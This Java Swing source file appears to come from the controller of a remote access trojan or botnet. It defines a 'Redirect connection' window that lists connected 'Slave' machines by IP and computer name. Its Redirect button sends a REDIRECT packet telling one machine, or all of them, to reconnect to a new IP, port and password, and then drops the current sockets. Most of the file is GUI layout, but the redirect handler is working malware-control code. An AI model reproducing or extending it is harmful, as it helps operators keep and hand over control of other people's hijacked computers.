package com.redpois0n.ui.frames;

import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.net.InetAddress;
import java.util.HashMap;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSpinner;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.SpinnerNumberModel;
import javax.swing.border.EmptyBorder;

import com.redpois0n.ErrorDialog;
import com.redpois0n.Main;
import com.redpois0n.Slave;
import com.redpois0n.exceptions.CloseException;
import com.redpois0n.packets.Header;
import com.redpois0n.packets.PacketBuilder;
import com.redpois0n.utils.NetworkUtils;


@SuppressWarnings("serial")
public class FrameRedirect extends BaseFrame {

	private JPanel contentPane;
	
	
	public Slave slave;
	public static HashMap<Slave, FrameRedirect> instances = new HashMap<Slave, FrameRedirect>();
	private JLabel lblTitle;
	private JTextField txtIP;
	private JLabel lblNewPort;
	private JSpinner spinnerPort;
	private JTextField txtPass;

	public FrameRedirect(Slave slave) {
		super();
		setResizable(false);
		if (slave == null) {
			setTitle("Redirect all connections");
		} else {
			setTitle("Redirect connection - " + slave.getIP() + " - " + slave.getComputerName());
		}
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRedirect.class.getResource("/icons/redirect.png")));
		this.slave = slave;
		final Slave sl = slave;
		instances.put(slave, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 355, 195);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		lblTitle = new JLabel("Redirect connection temporary");
		
		JLabel lblNewIp = new JLabel("New IP:");
		
		txtIP = new JTextField();
		txtIP.setColumns(10);
		
		JButton btnIntIP = new JButton("");
		btnIntIP.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					txtIP.setText(InetAddress.getLocalHost().getHostAddress());
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		btnIntIP.setToolTipText("Get internal IP");
		btnIntIP.setIcon(new ImageIcon(FrameRedirect.class.getResource("/icons/network-ip-local.png")));
		
		JButton btnExtIP = new JButton("");
		btnExtIP.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				try {
					txtIP.setText(NetworkUtils.getIP());
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		btnExtIP.setToolTipText("Get external IP");
		btnExtIP.setIcon(new ImageIcon(FrameRedirect.class.getResource("/icons/network-ip.png")));
		
		lblNewPort = new JLabel("New port:");
		
		spinnerPort = new JSpinner();
		spinnerPort.setModel(new SpinnerNumberModel(1336, 1, 65535, 1));
		
		if (slave != null) {
			spinnerPort.setValue(slave.getConnection().getServer().getLocalPort());
		}
		
		JLabel lblNewPass = new JLabel("New pass:");
		
		txtPass = new JTextField(slave == null ? "pass" : slave.getConnection().getPass());
		txtPass.setColumns(10);
		
		JButton btnRedirect = new JButton("Redirect");
		btnRedirect.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				if (sl != null) {
					sl.addToSendQueue(new PacketBuilder(Header.REDIRECT, new String[] { txtIP.getText().trim(), spinnerPort.getValue().toString(), txtPass.getText().trim()}));
					
					sl.closeSocket(new CloseException("Redirecting..."));
					
					exit();
					
					FrameControlPanel frame = FrameControlPanel.instances.get(sl);
					if (frame != null) {
						FrameControlPanel.instances.remove(sl);
						frame.setVisible(false);
						frame.dispose();
					}
				} else {
					for (Slave s : Main.connections) {
						s.addToSendQueue(new PacketBuilder(Header.REDIRECT, new String[] { txtIP.getText().trim(), spinnerPort.getValue().toString(), txtPass.getText().trim()}));								
					}
					
					while (Main.connections.size() > 0) {
						try {
							Main.connections.get(0).closeSocket(new CloseException("Redirecting..."));
						} catch (Exception e1) {
							e1.printStackTrace();
						}
					}
				}
				
				setVisible(false);
				dispose();
			}
		});
		btnRedirect.setIcon(new ImageIcon(FrameRedirect.class.getResource("/icons/redirect.png")));
		
		JButton btnCancel = new JButton("Cancel");
		btnCancel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				exit();
				setVisible(false);
				dispose();
			}
		});
		btnCancel.setIcon(new ImageIcon(FrameRedirect.class.getResource("/icons/delete.png")));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addComponent(lblTitle)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
								.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
									.addComponent(lblNewPort)
									.addComponent(lblNewIp))
								.addComponent(lblNewPass))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
								.addComponent(spinnerPort, GroupLayout.PREFERRED_SIZE, 67, GroupLayout.PREFERRED_SIZE)
								.addGroup(gl_contentPane.createSequentialGroup()
									.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false)
										.addComponent(txtPass, Alignment.LEADING)
										.addComponent(txtIP, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 189, Short.MAX_VALUE))
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(btnIntIP, GroupLayout.PREFERRED_SIZE, 37, GroupLayout.PREFERRED_SIZE)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(btnExtIP, GroupLayout.PREFERRED_SIZE, 37, GroupLayout.PREFERRED_SIZE)))))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
				.addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup()
					.addContainerGap(151, Short.MAX_VALUE)
					.addComponent(btnCancel)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnRedirect)
					.addContainerGap())
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
						.addComponent(btnExtIP, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)
						.addComponent(btnIntIP)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(lblTitle)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblNewIp)
								.addComponent(txtIP, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblNewPort)
						.addComponent(spinnerPort, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblNewPass)
						.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addGap(18)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnRedirect)
						.addComponent(btnCancel))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		contentPane.setLayout(gl_contentPane);
	}

	public void exit() {
		instances.remove(slave);
	}
}
